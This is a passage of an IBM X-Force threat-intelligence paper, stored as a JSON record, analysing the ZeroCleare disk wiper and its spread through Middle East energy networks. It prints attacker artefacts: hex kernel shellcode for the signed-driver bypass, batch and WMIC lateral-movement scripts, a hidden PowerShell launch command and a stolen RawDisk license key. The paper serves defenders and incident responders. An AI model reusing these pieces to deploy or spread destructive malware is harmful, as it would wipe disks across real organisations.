{
    "id": "9f7a8e01-6893-4617-8b0b-560ab605558c",
    "created_at": "2022-10-25T16:48:10.98838Z",
    "updated_at": "2025-03-27T02:17:27.570831Z",
    "deleted_at": null,
    "sha1_hash": "a83f4b160e2543812bf9ee048af1d8ce27aaa730",
    "title": "IBM X-Force IRIS ZeroCleare - Tehcnical Paper",
    "authors": "",
    "file_creation_date": "2020-01-22T21:12:15Z",
    "file_modification_date": "2020-01-22T21:12:28Z",
    "file_size": 554650,
    "plain_text": "# New Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East\n\n## IBM X-Force Incident Response and Intelligence Services (IRIS)\n\n January 2020\n\n\n-----\n\n## Table of Contents\n\n1. New Malware “ZeroCleare” Used in Destructive Attacks ............................................... 3\n\n1.1. Destructive Attacks – A Rising Concern ..................................................................... 4\n\n1.2. ZeroCleare’s General Infection Flow ......................................................................... 4\n\n1.3. Two ZeroCleare Versions, Only One Worked .............................................................. 5\n\n1.4. File #1: ClientUpdate.exe (x64) – aka ZeroCleare ..................................................... 7\n\n1.5. File #2: ClientUpdate.exe (x86) – aka ZeroCleare ..................................................... 8\n\n1.6. File #3: Soy.exe Analysis ........................................................................................... 9\n\n1.7. Batch Scripts Used by ZeroCleare Attackers ........................................................... 11\n\n1.8. PowerShell Scripts Used by ZeroCleare Attackers................................................... 12\n\n1.9. ZeroCleare: A Likely Collaboration Between Iranian State Sponsored Groups ........ 22\n\n1.10. A New Destructive Wiper Threat in the Wild ............................................................ 23\n\n1.11. Energy Sector in the Crosshairs ............................................................................... 24\n\n1.12. Mitigating the Risk Posed by Destructive Malware .................................................. 24\n\n2. Annex: IOCs ................................................................................................................. 27\n\n3. About IBM X-Force ....................................................................................................... 30\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n## 1. New Malware “ZeroCleare” Used in Destructive Attacks\n\nIBM® X-Force® has been researching and tracking destructive malware in the Middle East,\nparticularly in the industrial and energy sector. Since the first Shamoon attacks that started\naffecting organizations in the region in summer of 2012, we have been following the evolution\nof destructive, disk-wiping malware deployed to cause disruption.\n\n[In recent analysis, X-Force Incident Response and Intelligence Services (IRIS) discovered new](https://www.ibm.com/security/services/ibm-x-force-incident-response-and-intelligence)\n\n[malware from the Wiper class, used in a destructive attack](https://securityintelligence.com/posts/from-state-sponsored-attackers-to-common-cybercriminals-destructive-attacks-on-the-rise/) in the Middle East. We named this\nmalware “ZeroCleare” per the program database (PDB) pathname of its binary file.\n\nAccording to our analysis, ZeroCleare was used to execute a destructive attack that affected\norganizations in the energy and industrial sectors in the Middle East. Based on the analysis of\nthe malware and the attackers’ behavior, we suspect Iran-based nation state adversaries were\ninvolved to develop and deploy this new wiper.\n\nGiven the evolution of destructive malware targeting organizations in the region, we were not\nsurprised to find that ZeroCleare bears some similarity to the Shamoon malware. Taking a page\n[out of the Shamoon](https://exchange.xforce.ibmcloud.com/search/shamoon) playbook, ZeroCleare aims to overwrite the Master Boot Record (MBR) and\ndisk partitions on Windows-based machines. As Shamoon did before it, the tool of choice in the\nattacks is EldoS RawDisk, a legitimate toolkit for interacting with files, disks, and partitions.\nNation-state groups and cyber criminals frequently use legitimate tools in ways that a vendor\ndid not intend to accomplish malicious or destructive activity.\n\nUsing RawDisk with malicious intent enabled ZeroCleare’s operators to wipe the MBR and\ndamage disk partitions on a large number of networked devices. To gain access to the device’s\ncore, ZeroCleare used an intentionally vulnerable driver and malicious PowerShell/Batch\nscripts to bypass Windows controls. Adding these ‘living off the land’ tactics to the scheme,\nZeroCleare was spread to numerous devices on the affected network, sowing the seeds of a\ndestructive attack that could affect thousands of devices and cause disruption that could take\nmonths to fully recover from. These tactics resemble the way Shamoon was [launched in](https://www.zdnet.com/article/shamoons-data-wiping-malware-believed-to-be-the-work-of-iranian-hackers/)\nattacks on Arabian Gulf targets in 2018.\n\nX-Force IRIS assesses that the ITG13 threat group, also known as [APT34/OilRig, and at least](https://attack.mitre.org/groups/G0049/)\none other group, likely based out of Iran, collaborated on the destructive portion of the attack.\nX-Force IRIS’s assessment is based on ITG13's traditional mission, which has not included\nexecuting destructive cyber-attacks in the past, the gap in time between the initial access\n\nfacilitated by ITG13 and the last stage of the intrusion, as well as the different TTPs our team\nobserved.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nTo date, X-Force IRIS has not found any previous reporting on the \"ZeroCleare\" wiper, its\nindicators, or elements observed in this campaign. It is possible that it is a recently developed\nmalware and that the campaign we analyzed is one of the first to use this version.\n\n### 1.1. Destructive Attacks – A Rising Concern\n\nX-Force IRIS has been following a marked increase in destructive attacks in the past year,\nhaving logged a whopping 200 percent increase in the amount of destructive attacks that our\nteam has helped companies respond to over the past six months (comparing IBM incident\nresponse activities in the first half of 2019 versus the second half of 2018).\n\nDestructive attacks on the energy and industrial sectors have been a rising concern, especially\nin countries where the economy relies on oil and gas industries, like in some parts of the\n[Middle East and Europe. While we have seen them more frequently in the Middle East, these](https://www.securityweek.com/shamoon-3-attacks-targeted-several-sectors)\nattacks are not limited to any part of the world and can be launched by any offensive nationstate group seeking to adversely affect the economy of rival countries, or by cybercriminals\nthat use destruction as a pressure tactic.\n\nOverall, destructive attacks we have been seeing affect organizations are being carried out by\nthreat actors of varying motivations who could be employing destructive components in their\n\nattacks. Some pressure victims to pay them, others counterblow when they are not paid. When\nthese attacks are carried out by nation state adversaries, they often have military objectives\nthat can include accessing systems to deny access to, degrade, disrupt, deceive, or destroy the\ndevice/data.\n\n### 1.2. ZeroCleare’s General Infection Flow\n\nThe ZeroCleare wiper is part of the final stage of the overall attack. It is designed to deploy two\ndifferent ways adapted to 32-bit and 64-bit systems. The general flow of events on 64-bit\nmachines includes using a vulnerable, signed driver and then exploiting it on the target device\nto allow ZeroCleare to bypass the Windows hardware abstraction layer and avoid some\n\noperating system safeguards that prevent unsigned drivers from running on 64-bit machines.\n\nThis workaround has likely been used because 64-bit Windows based devices are protected\nwith Driver Signature Enforcement (DSE). This control is designed to only allow drivers which\nhave been signed by Microsoft to run on the device. Since ZeroCleare relies on the EldoS\nRawDisk driver, which is not a signed driver and would therefore not run by default, the\nattackers use an intermediary file named soy.exe to perform the workaround. They load a\nvulnerable but signed VBoxDrv driver which the DSE accepts and runs and then exploits it to\nload the unsigned driver, thereby avoiding DSE rejection of the EldoS driver.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nOnce loaded, the vulnerable VBoxDrv driver is exploited to run shellcode on the kernel level.\nPost-exploitation, the driver was used to load the unsigned EldoS driver and proceed to the\ndisk wiping phase.\n\nHaving analyzed soy.exe, we determined it was a modified version of the Turla Driver Loader\n(TDL) of which purpose is to facilitate that very DSE bypass.\n\nThe same process does not apply to the 32-bit systems as they do not limit running unsigned\ndrivers in the same manner.\n\n**Figure 1: ZeroCleare’s Top Level Infection Flow (Source: IBM X-Force)**\n\n### 1.3. Two ZeroCleare Versions, Only One Worked\n\nThe ZeroCleare attack is facilitated by a number of files that each fulfill a different role in the\ninfection chain. Files we analyzed are either scripts or executables designed to spread and\nlaunch the ZeroCleare malware across the targeted infrastructure.\n\nZeroCleare comes in two versions, one for each Windows architecture (32-bit and 64-bit), but\nwhile both exist, only the 64-bit worked as intended. The 32-bit version was supposed to\nfunction by installing the EldoS RawDisk driver as a driver service before beginning the wiping\nprocess but caused itself to crash when attempting to access the service during the wiping\nprocess.\n\nThe analysis in this paper will focus on the 64-bit version of ZeroCleare.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n#### 1.3.1. Attackers’ File Arsenal\n\nThe following table lists the files we analyzed as part of what enabled attackers to infect\ndevices with ZeroCleare and spread through compromised networks.\n\n**Index** **File Name** **Category** **File Hash** **Parent**\n\nClientUpdate.exe\n**1** Wiper 1a69a02b0cd10b1764521fec4b7376c9 ClientUpdate.ps1\n(x64)\n\nClientUpdate.exe\n**2** Wiper 33f98b613b331b49e272512274669844 ClientUpdate.ps1\n(x86)\n\n**3** elrawdsk.sys (x86) Tool 69b0cec55e4df899e649fa00c2979661 ClientUpdate.ps1\n\n**4** soy.exe Loader 1ef610b1f9646063f96ad880aad9569d ClientUpdate.ps1\n\n**5** elrawdsk.sys (x64) Tool 993e9cb95301126debdea7dd66b9e121 soy.exe\n\n**6** saddrv.sys Tool eaea9ccb40c82af8f3867cd0f4dd5e9d soy.exe\n\nPowerShell\n**7** ClientUpdate.txt 1dbf3e9c84a89512a52da5b0bb682460 N/A\nScript\n\nPowerShell\n**8** ClientUpdate.ps1 08dc0073537b588d40deda1f31893c52 N/A\nScript\n\nBatch\n**9** cu.bat Hash depends on specific deployment N/A\nScript\n\nBatch\n**10** v.bat Hash depends on specific deployment N/A\nScript\n\nBatch\n**11** 1.bat Hash depends on specific deployment N/A\nScript\n\nBatch\n**12** 2.bat Hash depends on specific deployment N/A\nScript\n\nBatch\n**13** 3.bat Hash depends on specific deployment N/A\nScript\n\nBatch\n**14** 4.bat Hash depends on specific deployment N/A\nScript\n\nBatch\n**15** 5.bat Hash depends on specific deployment N/A\nScript\n\n**Table 1: ZeroCleare attacks: malware and supporting files**\n\nThe following are some overarching notes regarding the file list:\n\n− The PowerShell and batch scripts analyzed were designed to spread and execute the\nZeroCleare malware across the domain.\n\n− The main PowerShell script, ClientUpdate.ps1 spreads itself to Domain Controllers\n(DC), and then from those severs it uses the Active Directory PowerShell module Get**ADComputer cmdlet to identify lists of target devices to copy and execute the malware**\non.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n|Index|File Name|Category|File Hash|Parent|\n|---|---|---|---|---|\n|1|ClientUpdate.exe (x64)|Wiper|1a69a02b0cd10b1764521fec4b7376c9|ClientUpdate.ps1|\n|2|ClientUpdate.exe (x86)|Wiper|33f98b613b331b49e272512274669844|ClientUpdate.ps1|\n|3|elrawdsk.sys (x86)|Tool|69b0cec55e4df899e649fa00c2979661|ClientUpdate.ps1|\n|4|soy.exe|Loader|1ef610b1f9646063f96ad880aad9569d|ClientUpdate.ps1|\n|5|elrawdsk.sys (x64)|Tool|993e9cb95301126debdea7dd66b9e121|soy.exe|\n|6|saddrv.sys|Tool|eaea9ccb40c82af8f3867cd0f4dd5e9d|soy.exe|\n|7|ClientUpdate.txt|PowerShell Script|1dbf3e9c84a89512a52da5b0bb682460|N/A|\n|8|ClientUpdate.ps1|PowerShell Script|08dc0073537b588d40deda1f31893c52|N/A|\n|9|cu.bat|Batch Script|Hash depends on specific deployment|N/A|\n|10|v.bat|Batch Script|Hash depends on specific deployment|N/A|\n|11|1.bat|Batch Script|Hash depends on specific deployment|N/A|\n|12|2.bat|Batch Script|Hash depends on specific deployment|N/A|\n|13|3.bat|Batch Script|Hash depends on specific deployment|N/A|\n|14|4.bat|Batch Script|Hash depends on specific deployment|N/A|\n|15|5.bat|Batch Script|Hash depends on specific deployment|N/A|\n\n\n-----\n\n− The Batch scripts support spreading the malware but work in a more simplistic manner\nusing premade text files that contain hostnames to infect, rather than generating the\nlists themselves.\n\n− We found that the ZeroCleare Wiper’s executable itself, delivered in a file named\n**ClientUpdate.exe, ran with a legitimate license key for EldoS RawDisk driver.**\n\nThe following sections of this paper provide analysis of the ZeroCleare malware, as well as\ntechnical details on supporting files listed in Table 1.\n\n### 1.4. File #1: ClientUpdate.exe (x64) – aka ZeroCleare\n\n**File name** **Type** **MD5** **Compiled**\n\n**ClientUpdate.exe** 64-bit Windows 1a69a02b0cd10b1764521fec4b7376c9 15 Jun 2019,\n**(x64)** binary 10:47:12\n\nThis file was identified as the new wiper that was deployed in destructive attacks to damage\nWindows-based devices. It was named ZeroCleare by IRIS per the file path of its PDB file.\n\nAs mentioned earlier in this paper, ZeroCleare relies on the legitimate EldoS RawDisk driver\nthat was previously used in Shamoon attacks to access and wipe the hard drive directly. Using\nthis driver, which is an inherently legitimate tool, allows ZeroCleare attackers to bypass the\nWindows hardware abstraction layer and avoid the OS safeguards.\n\nTo install the EldoS RawDisk driver, ZeroCleare uses another binary, Soy.exe, to load the driver\non the targeted device and activate it.\n\nX-Force IRIS analyzed Soy.exe and found that it is a modified version of the [Turla Driver Loader](https://github.com/hfiref0x/TDL)\n(TDL), which is designed to bypass x64 Windows Driver Signature Enforcement. The TDL\napplication works by first installing a legitimate but [vulnerable, signed, VirtualBox driver,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3431)\nvboxdrv.sys (in this case it is named saddrv.sys). Once loaded, this vulnerable driver can be\n\nexploited to run shellcode at the kernel level, which in this case is used to load the unsigned\nEldoS driver.\n\n**ClientUpdate.exe executes soy.exe via the following command line:**\n\n|File name|Type|MD5|Compiled|\n|---|---|---|---|\n|ClientUpdate.exe (x64)|64-bit Windows binary|1a69a02b0cd10b1764521fec4b7376c9|15 Jun 2019, 10:47:12|\n\n```\ncmd.exe /c soy.exe\n\n```\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nIn order to activate the disk management driver, the malware needed to open a file handle via\na unique filename using the logical drive (For example, C:\\). The file name's format requested\nby function CreateFileW must start with # followed by the license key issued to the developer\nby EldoS.\n\nWe have observed ZeroCleare attempt to open the following filename:\n```\n\\\\?\\ElRawDisk\\??\\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf\n3c911e2287a4b906d47d\n\n```\nThe RawDisk license key was:\n\n```\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\n```\n\nIt could be a temporary license key or one that was stolen from someone else. Various\ninformation stealing malware can obtain license keys from infected systems.\n\nThe ClientUpdate.exe (x64) wiping function creates a buffer consisting of the byte 0x55 and\nuses function DeviceIoControl to send the buffer to the RawDisk driver to write data to the disk\nand wipe the victim's hard drives. Similar to what the Shamoon malware does, this would\noverwrite the MBR, partitions, and files on the system with junk data.\n\nThe sample was observed to contain the following PDB string:\n\n```\nC:\\Users\\Developer\\source\\repos\\ZeroCleare\\x64\\Release\\zeroclear.pdb\n\n```\n\n### 1.5. File #2: ClientUpdate.exe (x86) – aka ZeroCleare\n\n**File name** **Type** **MD5** **Compiled**\n\n**ClientUpdate.exe** 32-bit Windows 33f98b613b331b49e272512274669844 15 Jun 2019,\n**(x86)** binary 11:38:44\n\nSame as ClientUpdate.exe (x64), this file was also identified as the ZeroCleare wiper. As it is\ndesigned for 32-bit Windows systems, Driver Signature Enforcement does not prevent\nunsigned drivers from running. Therefore, this version of ZeroCleare does need to use Soy.exe\nor TDL, the latter being only applicable to 64-bit systems.\n\nClientUpdate.exe (x86) first attempts to install itself as a service by running:\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n|File name|Type|MD5|Compiled|\n|---|---|---|---|\n|ClientUpdate.exe (x86)|32-bit Windows binary|33f98b613b331b49e272512274669844|15 Jun 2019, 11:38:44|\n\n\n-----\n\n```\nC:\\windows\\system32\\cmd.exe /u /c sc create soydsk type= kernel start= demand binPath\n= [sample path]\n\n```\nNext, it attempts to activate the disk management device driver by opening a file handle via a\nunique filename using the logical drive (For example, C:\\). The file name's format requested by\nfunction CreateFileW must start with # followed by the license key issued to the developer by\nEldoS. This 32-bit ZeroCleare version attempts to open the following filename:\n```\n\\\\?\\ElRawDisk\\??\\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf\n3c911e2287a4b906d47d\n\n```\nThe malware uses the same EldoS RawDisk driver license key as observed in the 64-bit\nversion:\n\n```\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\n```\n\nThis version did not work properly. During analysis the sample crashed as the disk\nmanagement driver had not been installed and was therefore not accessible. We can theorize\nthat this may be a bug in the code.\n\nIt was later confirmed that the sample required to be named ‘zeroclear.exe’ in order to run\ncorrectly. However, this was not the name used for the malware during the observed incident\nand therefore the binary would not have run correctly in that instance.\n\nX-Force IRIS patched the 32-bit ZeroCleare sample in order to continue the analysis provided\nin this paper. Once it worked, we noted that this version’s wiping behavior was similar to that\nof ClientUpdate.exe (x64), which functioned by creating a buffer consisting of ‘0x55’ bytes and\nused the function DeviceIoControl to send the buffer to the RawDisk driver to write data that\nwould wipe the victim's hard drive(s). Similar to what the Shamoon malware does, this would\noverwrite the MBR, partitions, and files on the system with junk data.\n\nThis file was saved in the following PDB file path:\n\n```\nC:\\Users\\Developer\\source\\repos\\ZeroCleare32\\Release\\zeroclear.pdb\n\n```\n\n### 1.6. File #3: Soy.exe Analysis\n\n**File name** **Type** **MD5**\n\n**Soy.exe** 64-bit Windows 1ef610b1f9646063f96ad880aad9569d\nbinary\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n|File name|Type|MD5|Compiled|\n|---|---|---|---|\n|Soy.exe|64-bit Windows binary|1ef610b1f9646063f96ad880aad9569d|15 Jun 2019, 7:04:22|\n\n\n-----\n\nThe file soy.exe had a special role in the overall kill chain of ZeroCleare attacks as it was\nnecessary for the initial bypass of Windows OS controls. This file was identified as a\ncustomized version of the [Turla Driver Loader](https://github.com/hfiref0x/TDL) (TDL), which is a driver loader application\n_designed for bypassing Windows x64 Driver Signature Enforcement (DSE). DSE is a protective_\nfeature that was introduced in 64-bit versions of Windows 8 and 10, to prevent the loading of\ndrivers unsigned by Microsoft.\n\nTDL works by first loading a legitimate, Microsoft-signed, VirtualBox VBoxDrv driver. However,\n\na vulnerable version of the driver is intentionally used, and TDL can then exploit the\nvulnerability to run kernel-level shellcode and ultimately load other, unsigned drivers.\n\nThe file sample's resource section includes two encoded resources with the following hashes:\n\n```\nResource ID 1: b1ba74d92395012253b33462c67a726ff266c126f2652092c2f57659d0f46e77\n\n```\n```\nResource ID 103: 37680a5a26abc22cde99c5222881a279a04b90680231736efac1e17a8e976755\n\n```\n\nBefore decoding the resources, soy.exe creates a mutex called Ptición de trabajo. It then\nattempts to access its resource section to read encoded resource 103 and uses XOR key 0x\n```\nAAAAAAAAAAAAAAAA to decode it. Next, soy.exe writes the decoded content to a 64-bit file called\nelrawdsk.sys[1]. This file was identified as the 64-bit version of the EldoS RawDisk driver,\n\n```\nversion 3.0.31.\n\nAfter that, soy.exe attempts to access resource 1 and uses XOR key 0xAAAAAAAAAAAAAAAA to\ndecode it. The soy.exe sample then writes the decoded content to a 64-bit VirtualBox\nVBoxDrv.sys driver file called saddrv.sys[2], which is known to have privilege escalation and\narbitrary code execution vulnerabilities. This file is a signed driver.\n\nOnce the resources have been decoded, soy.exe tries to create and start a driver service with\nname VBoxDrv and saddrv.sys, in order to load the vulnerable VBoxDrv device driver. At this\n\npoint, the soy.exe sample uses the Turla Driver Loader (TDL) method to exploit the\nvulnerability in the VirtualBox driver and load and execute the following shellcode:\n\n```\n90 48 8B C4 41 54 48 81 EC 90 00 00 00 48 89 58 10 49 89 D4 48 89 68 18 48 8D 1D E1 FF FF FF 4C\n\n```\n```\n89 68 E8 48 81 C3 00 03 00 00 4C 89 70 E0 4C 8B EA 4C 89 78 D8 4C 8B C9 33 C9 41 B8 54 64 6C 53\n\n```\n```\n4C 63 73 3C 4C 03 F3 45 8B 7E 50 41 8D 97 00 10 00 00 41 FF D1 45 33 C9 48 8D A8 00 10 00 00 48\n\n```\n```\n81 E5 00 F0 FF FF 41 83 BE 84 00 00 00 05 0F 86 B0 00 00 00 41 8B 8E B0 00 00 00 85 C9 0F 84 A1\n\n```\n\n1 36a4e35abf2217887e97041e3e0b17483aa4d2c1aee6feadd48ef448bf1b9e6c, driver v3.0.31\n\n2 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986, v1.6\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n```\n00 00 00 48 89 B4 24 B8 00 00 00 4C 8D 04 0B 41 8B B6 B4 00 00 00 4C 8B DD 4D 2B 5E 30 48 89 BC\n\n```\n```\n24 88 00 00 00 41 8B F9 85 F6 74 68 0F 1F 44 00 00 41 B9 08 00 00 00 4D 8D 50 08 45 39 48 04 76\n\n```\n```\n43 41 0F B7 02 8B C8 C1 E9 0C 83 F9 03 74 17 83 F9 0A 75 22 41 8B 10 25 FF 0F 00 00 48 8D 0C 03\n\n```\n```\n4C 01 1C 0A EB 10 41 8B 10 25 FF 0F 00 00 48 8D 0C 03 44 01 1C 0A 49 83 C2 02 41 83 C1 02 45 3B\n\n```\n```\n48 04 72 BD 41 8B 40 04 03 F8 4C 03 C0 3B FE 72 A0 45 33 C9 48 8B B4 24 B8 00 00 00 48 8B BC 24\n\n```\n```\n88 00 00 00 49 8B D7 4C 8B 7C 24 70 48 C1 EA 03 48 85 D2 74 1D 48 8B CD 48 2B DD 66 0F 1F 44 00\n\n```\n```\n00 48 8B 04 0B 48 89 01 48 8D 49 08 48 83 EA 01 75 EF 90 41 8B 46 28 48 03 C5 48 89 C2 66 C7 44\n\n```\n```\n24 20 20 00 66 C7 44 24 22 22 00 C7 44 24 24 00 00 00 00 48 8D 44 24 30 48 89 44 24 28 48 B8 5C\n\n```\n```\n00 44 00 72 00 69 00 48 89 44 24 30 48 B8 76 00 65 00 72 00 5C 00 48 89 44 24 38 48 B8 65 00 6C\n\n```\n```\n00 52 00 61 00 48 89 44 24 40 48 B8 77 00 44 00 73 00 6B 00 48 89 44 24 48 48 C7 44 24 50 00 00\n\n```\n```\n00 00 48 8D 4C 24 20 44 0F 20 C0 48 89 C5 48 31 C0 44 0F 22 C0 41 FF D4 48 89 E8 44 0F 22 C0 4C\n\n```\n```\n8B 74 24 78 4C 8B AC 24 80 00 00 00 48 8B AC 24 B0 00 00 00 48 8B 9C 24 A8 00 00 00 48 81 C4 90\n\n```\n```\n00 00 00 41 5C C3 00 00\n\n```\n\n**Figure 2: TDLBootstrapLoader in shellcode format. This code is used to load the elrawdsk.sys driver**\n**into the Windows kernel.**\n```\nsoy.exe was also found to contain the following PDB file path:\n\n```\n```\nC:\\Users\\[user]\\Desktop\\TDL\\Source\\Furutaka\\output\\x64\\Release\\soy.pdb\n\n```\n\nThe presence of ‘Furutaka’ within the PDB string matches that seen within the source code on\nthe TDL Github[3].\n\n### 1.7. Batch Scripts Used by ZeroCleare Attackers\n\nA batch file is a script file that’s typical to DOS, OS/2 and Microsoft Windows. It consists of a\nseries of commands to be executed by the command-line interpreter, stored in a plain text file.\n\nOn devices running Windows operating systems, a batch file would store commands in serial\norder. ZeroCleare attackers used at least seven batch files in the attack’s flow to add\nfunctionality.\n\n#### 1.7.1. v.bat\n\nBatch script v.bat is designed to read a text file containing system hostnames. In this case, the\nfile is called 'listfile.txt' although other names for this file have also been observed.\n\n3 https://github.com/hfiref0x/TDL/tree/master/Source/Furutaka\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nFor each hostname within the list, the script first copies the contents of directory\n```\n\"C:\\Users\\$USER \\Desktop\\UpdateTemp\" to \"\\\\$hostname\\c$\\Windows\\Temp\" and then attempts\n\n```\nto run \"cmd /c c:\\Windows\\Temp\\cu.bat\" using Windows Management Interface Command\n(WMIC), which is a simple command prompt tool that returns information about the system\nthat’s running it.\n\n```\nfor /F \"tokens=*\" %%A in (listfile.txt) do (\n\n```\n```\nxcopy /S /Y \"C:\\Users\\$USER\\Desktop\\UpdateTemp\" \\\\%%A\\c$\\Windows\\Temp && wmic /node:\"\n%%A\" process call create \"cmd /c c:\\Windows\\Temp\\cu.bat\"\n\n```\n```\n)\n\n```\n\nBatch files 1.bat, 2.bat, 3.bat, 4.bat, and 5.bat appear redundant as they were all identified\nto have the same function as v.bat.\n\n#### 1.7.2. Cu.bat\n\nOnce it is run by its predecessor (v.bat), the batch script cu.bat begins by switching to the\ndirectory C:\\Windows\\Temp. It checks for the existence of '%PROGRAMFILES(X86)%' to determine\nif it is running on a 64- or 32-bit system architecture. It will change to the 'x64' directory as\nneeded, but otherwise the switch proceeds with the 'x86' directory. Once that’s established,\n```\ncu.bat runs the file .\\ClientUpdate.exe, which is the ZeroCleare malware.\n\n```\n```\ncd c:\\Windows\\Temp\\\n\n```\n```\nIF EXIST \"%PROGRAMFILES(X86)%\" (cd .\\x64) ELSE (cd .\\x86)\n\n```\n```\n.\\ClientUpdate.exe\n\n```\n\n### 1.8. PowerShell Scripts Used by ZeroCleare Attackers\n\nPowerShell is a task-based command-line shell and scripting language built on .NET. As such,\nit is part of every Windows operating system. While PowerShell is originally designed to help\nsystem administrators and power-users rapidly automate tasks that manage OS and its\nprocesses, it is also widely used by attackers that rely on ‘living off the land’ tactics.\n\nZeroCleare attackers used some PowerShell scripts in the attack kill chain. Further detail\nfollows.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n#### 1.8.1. ClientUpdate.ps1\n\nX-Force IRIS identified two PowerShell scripts with the name ClientUpdate.ps1. The first and\nshorter of the two appeared to be the parent of the second and larger script.\n\nThe first, short script,[4] takes as its parameter a decryption key and defines a variable\n```\n$ClientData which contains a large quantity of AES-encrypted and Base64-encoded data. The\n\n```\nscript decodes this data with the decryption key, saves it in the current directory as\n```\n_ClientUpdate.ps1, and executes it using PowerShell.exe. It passes the decryption key as a\n\n```\nparameter. It then sleeps for 5 seconds before deleting the newly created script file.\n\nWe were able to identify the decryption key from system artifacts and discovered that the\n```\n$ClientData variable contained the larger version of the ClientUpdate.ps1 script.\n\n```\nThe second ClientUpdate.ps1 script[5] is significantly longer and more complex. The overall\npurpose of this script is to spread the ZeroCleare malware as far as it can across the domain.\nThis script sets out to do that by setting up a network of master and slave (agent) systems,\nwith each agent responsible for copying and executing the malware onto a proportion of the\ntarget (client) systems.\n\nDomain controllers were specifically chosen as agents to facilitate the spreading, and the\nActive Directory PowerShell module 'Get-ADComputer' cmdlet was used to assemble lists of\ntarget and client systems.\n\nThe script accepts a large variety of parameters, most of which are optional with the exception\nof Username, Password, and Decryption key.\n\n  - UserName (passed as base64)\n\n  - Password (passed as base64)\n\n  - DECKey (decryption key)\n\n  - CleanUpShareDrives (default: false)\n\n  - DCParent\n\n  - LogPath (default: C:\\Log)\n\n  - MasterSlave\n\n  - AgentMode (false)\n\n  - AgentTimeOut (30)\n\n4 **MD5:08dc0073537b588d40deda1f31893c52**\n5 **MD5:15DF71FAD932AE2AE8F162AB0167D71F**\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n  - FailedMode (ExchangeSingle or ExchangeSwap)\n\n  - Master\n\n  - RunMode (IMM or SCH)\n\n  - TimeSpan (30)\n\n  - MaxThreads (30)\n\n  - ClientCheckPort (445)\n\n  - ClientCheckTimeOut (2)\n\n  - ClientForceCopy (false)\n\n  - DCHostName\n\nAn example of the script being run was observed as follows:\n```\npowershell.exe -exec bypass -WindowStyle Hidden -NoLogo -file \"C:\\Users\\Public\\Public\nUpdates\\ClientUpdate.ps1\" -Master -RunMode \"IMM\" -TimeSpan 12 -MaxThreads 30 -ClientC\nheckPort 445 -ClientCheckTimeOut 2 -UserName \"string here\" -Password \"string here\" -D\nECKey \"abc123\" -ClientForceCopy -CleanUpShareDrives -DCParent \"dc01.domain.com\"\n\n```\nThe script is multifunctional and can act in a master or slave capacity depending on the\nparameters originally passed to it.\n\n**Master and Slave Modes**\n\nThe ClientUpdate.ps1 PowerShell script has two main modes of operation:\n\n**1.** **$Master**\n\nIf it is running in $Master mode, the script identifies other domain controllers, then\ncopies and executes the script on those machines in the $Master mode. It identifies all\nnon-DC client/target systems and begins to copy and execute the ClientUpdate.exe\nwiper malware on them, with the other initiated domain controllers doing the same.\n\n**2.** **$MasterSlave**\n\nIn $MasterSlave mode, one domain controller will act as the Master and identify other\ndomain controllers to copy and run the script on them in Agent/Slave mode. The work\n\nof copying and executing the malware on the client targets is then divided up by the\nmaster and assigned to the agents, who then report back to the master on their\nprogress.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nThe way the script is laid out means that the same script can be used by master or agent\nsystems with the parameters determining what function they should be performing.\n\nThe main body of the script performs the following:\n\n− First it runs the 'Update-DCGPO' function which creates a new GPO to run script\n```\n    ClientUpdateCore.ps1 on startup. The GPO is named \"ClietnUpdate\" (note the\n\n```\nmisspelling).\n\n− If parameters $MasterSlave -eq $true -and $AgentMode -eq $false, then run functions:\n\n`o` CleanUp-ShareDrives\n\n`o` Start-DCController\n\n− If parameters $MasterSlave -eq $true -and $AgentMode -eq $true, then run functions:\n\n`o` CleanUp-ShareDrives (only if parameter $CleanUpShareDrives is true)\n\n`o` Start-AgentController\n\n`o` Extract-Self\n\n`o` Execute-Self\n\n− If parameter $Master -eq $true\n\n`o` CleanUp-ShareDrives\n\n`o` Start-MasterController\n\n`o` Extract-Self\n\n`o` Execute-Self\n\nFurther details of the functions listed above, are presented in the sections 